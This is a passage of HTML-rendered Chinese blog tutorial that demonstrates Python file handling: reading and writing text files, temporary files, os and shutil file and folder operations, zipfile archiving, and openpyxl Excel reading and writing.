class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'.gitignore'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token operator">>></span><span class="token operator">></span> text<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'.DS_Store\n'</span><span class="token punctuation">,</span> <span class="token string">'Thumbs.db\n'</span><span class="token punctuation">,</span> <span class="token string">'db.json\n'</span><span class="token punctuation">,</span> <span class="token string">'*.log\n'</span><span class="token punctuation">,</span> <span class="token string">'node_modules/\n'</span><span class="token punctuation">,</span> <span class="token string">'public/\n'</span><span class="token punctuation">,</span> <span class="token string">'.deploy*/'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一种建议的写法，不管程序是否正常运行都会关闭文件，不需要再单独写close()</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'.gitignore'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     text<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">[</span><span class="token string">'.DS_Store\n'</span><span class="token punctuation">,</span> <span class="token string">'Thumbs.db\n'</span><span class="token punctuation">,</span> <span class="token string">'db.json\n'</span><span class="token punctuation">,</span> <span class="token string">'*.log\n'</span><span class="token punctuation">,</span> <span class="token string">'node_modules/\n'</span><span class="token punctuation">,</span> <span class="token string">'public/\n'</span><span class="token punctuation">,</span> <span class="token string">'.deploy*/'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     text<span class="token operator">=</span><span class="token string">'first line\nsecondline\n'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>‘w’表示写入，若文件不存在则会创建新文件，若存在，则会将文件原内容清空，然后写入内容  </li><li>‘a’表示追加，若件不存在则会创建新文件，若存在，则会在文件最后追加内容，而不清空原内容</li></ul><h3 id="创建临时文件及文件夹"><a href="#创建临时文件及文件夹" class="headerlink" title="创建临时文件及文件夹"></a>创建临时文件及文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tempfile <span class="token keyword">import</span> TemporaryFile<span class="token keyword">with</span> TemporaryFile<span class="token punctuation">(</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>‘w+’表示写入及读取文件      </li><li>seek(0)表示回到文件开头位置    </li><li>在程序运行完之后会自动删掉临时文件     </li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tempfile <span class="token keyword">import</span> TemporaryDirectory<span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tmp_folder<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'临时文件夹已创建：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp_folder<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>PS F<span class="token punctuation">:</span>\blog\hexo<span class="token operator">></span> python <span class="token operator">-</span>u <span class="token string">"f:\blog\hexo\source\_posts\1.py"</span>临时文件夹已创建：E<span class="token punctuation">:</span>\Temp\tmp8mcwp0aw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="批量操作文件及文件夹"><a href="#批量操作文件及文件夹" class="headerlink" title="批量操作文件及文件夹"></a>批量操作文件及文件夹</h2><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'newdir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="检测文件夹是否存在"><a href="#检测文件夹是否存在" class="headerlink" title="检测文件夹是否存在"></a>检测文件夹是否存在</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'newdir'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'newdir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="创建多层文件夹"><a href="#创建多层文件夹" class="headerlink" title="创建多层文件夹"></a>创建多层文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token string">'1/2/3'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="复制、移动、重命名"><a href="#复制、移动、重命名" class="headerlink" title="复制、移动、重命名"></a>复制、移动、重命名</h3><p>使用shutil模块</p><h4 id="复制文件有两种使用方式"><a href="#复制文件有两种使用方式" class="headerlink" title="复制文件有两种使用方式"></a>复制文件有两种使用方式</h4><ol><li>第二个参数写某个文件夹位置，则复制到该文件夹下</li><li>第二个参数写某个文件路径，复制到这个路径并且重命名</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> shutil<span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'./sqlmap'</span><span class="token punctuation">)</span><span class="token string">'./sqlmap\\mysql.txt'</span><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'./sqlmap/2.txt'</span><span class="token punctuation">)</span> <span class="token string">'./sqlmap/2.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复制文件夹"><a href="#复制文件夹" class="headerlink" title="复制文件夹"></a>复制文件夹</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>copytree<span class="token punctuation">(</span><span class="token string">'GAME'</span><span class="token punctuation">,</span><span class="token string">'game2'</span><span class="token punctuation">)</span><span class="token string">'game2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="移动文件或文件夹"><a href="#移动文件或文件夹" class="headerlink" title="移动文件或文件夹"></a>移动文件或文件夹</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'GAME/'</span><span class="token punctuation">)</span><span class="token string">'GAME/mysql.txt'</span><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'GAME/2.txt'</span><span class="token punctuation">)</span> <span class="token string">'GAME/2.txt'</span><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'GAME'</span><span class="token punctuation">,</span><span class="token string">'sqlmap/'</span><span class="token punctuation">)</span><span class="token string">'sqlmap/GAME'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>记住第二个参数若为文件夹最后要加斜杠/</p></blockquote><h4 id="重命名文件或文件夹"><a href="#重命名文件或文件夹" class="headerlink" title="重命名文件或文件夹"></a>重命名文件或文件夹</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'database_notes.txt'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string">'GAME'</span><span class="token punctuation">,</span><span class="token string">'LOL'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>只能删文件，如果给了一个文件夹路径则会报错</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'remove.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span><span class="token string">'remove'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建和解压压缩包"><a href="#创建和解压压缩包" class="headerlink" title="创建和解压压缩包"></a>创建和解压压缩包</h2><h3 id="读取压缩包"><a href="#读取压缩包" class="headerlink" title="读取压缩包"></a>读取压缩包</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> zipfile<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>zipobj<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">[</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'2.txt'</span><span class="token punctuation">,</span> <span class="token string">'3.txt'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若文件列表中有中文文件名，则需要调整编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">for</span> filename <span class="token keyword">in</span> zipobj<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'cp437'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">1.</span>txt<span class="token number">2.</span>txt<span class="token number">3.</span>txt中文<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">for</span> filename <span class="token keyword">in</span> zipobj<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             info<span class="token operator">=</span>zipobj<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             new_filename<span class="token operator">=</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'cp437'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">1.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'1.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token number">2.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'2.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token number">3.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'3.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span>中文<span class="token punctuation">.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'╓╨╬─.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>info属性：   </p><ul><li>.file_size 原始文件大小</li><li>.compress_size 压缩后大小<br>单位为字节</li></ul><h3 id="解压压缩包"><a href="#解压压缩包" class="headerlink" title="解压压缩包"></a>解压压缩包</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解压所有文件，可选参数为path</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'./extract/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>若压缩包有密码，则使用可选参数pwd</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'./extract/'</span><span class="token punctuation">,</span>pwd<span class="token operator">=</span><span class="token string">b'123'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>不要忘记pwd参数加b</p></blockquote><h3 id="创建压缩包"><a href="#创建压缩包" class="headerlink" title="创建压缩包"></a>创建压缩包</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfilefile_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'extract/'</span><span class="token punctuation">]</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'new.zip'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        zipobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意with一行是w,即写入模式</p></blockquote><h3 id="向已有压缩包添加文件"><a href="#向已有压缩包添加文件" class="headerlink" title="向已有压缩包添加文件"></a>向已有压缩包添加文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'new.zip'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'sqli.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意with一行是a,即追加模式</p></blockquote><h2 id="处理excel文件"><a href="#处理excel文件" class="headerlink" title="处理excel文件"></a>处理excel文件</h2><h3 id="Excel表格术语"><a href="#Excel表格术语" class="headerlink" title="Excel表格术语"></a>Excel表格术语</h3><ul><li>行：row,从1开始计数</li><li>列：column</li><li>格子：cell</li><li>表：sheet</li></ul><h3 id="打开及读取表格数据"><a href="#打开及读取表格数据" class="headerlink" title="打开及读取表格数据"></a>打开及读取表格数据</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'Sheet1'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span>dimensions<span class="token punctuation">)</span>         <span class="token comment">#.dimensions是从左上角坐标到右下角坐标</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取一系列格子"><a href="#获取一系列格子" class="headerlink" title="获取一系列格子"></a>获取一系列格子</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>active                       <span class="token comment">#.active 打开活跃的/唯一的表格</span>cell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span>row<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>column<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>coordinate<span class="token punctuation">)</span>cell<span class="token operator">=</span>sheet<span class="token punctuation">.</span>cell<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>             <span class="token comment">#根据坐标获取具体cell</span><span class="token keyword">print</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span>row<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>column<span class="token punctuation">,</span>cell<span class="token punctuation">.</span>coordinate<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A1:A3'</span><span class="token punctuation">]</span>                        <span class="token comment">#获取一系列格子</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span>                            <span class="token comment">#获取A列数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A:C'</span><span class="token punctuation">]</span>                          <span class="token comment">#获取A到C列数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>                              <span class="token comment">#获取第2行数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span>cells<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'2:3'</span><span class="token punctuation">]</span>                          <span class="token comment">#获取第2到3行数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>cells<span class="token punctuation">)</span><span class="token keyword">for</span> row <span class="token keyword">in</span> sheet<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#指定行和列的范围，按行获取</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token keyword">for</span> col <span class="token keyword">in</span> sheet<span class="token punctuation">.</span>iter_cols<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#指定行和列的范围，按列获取</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token keyword">for</span> row <span class="token keyword">in</span> sheet<span class="token punctuation">.</span>rows<span class="token punctuation">:</span>                      <span class="token comment">#所有行</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="向表格中写入内容"><a href="#向表格中写入内容" class="headerlink" title="向表格中写入内容"></a>向表格中写入内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'abc'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A2'</span><span class="token punctuation">]</span>cell<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">'aaa'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>要.save保存</p></blockquote><h4 id="插入一行"><a href="#插入一行" class="headerlink" title="插入一行"></a>插入一行</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activedata<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> data<span 